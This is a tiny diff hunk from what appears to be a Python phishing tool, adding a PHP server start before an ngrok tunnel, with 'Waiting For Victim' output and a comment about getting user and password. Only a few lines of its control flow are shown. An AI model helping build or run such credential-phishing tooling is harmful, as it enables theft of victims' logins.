@@ -560,6 +560,7 @@ exit();""")
       time.sleep(0.07)
       print(Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+" Waiting For Victim ! ! !")
     elif v == "02":
+       phpserver ()
        ngrokserver()
        print(a)
  # Getting User And Password
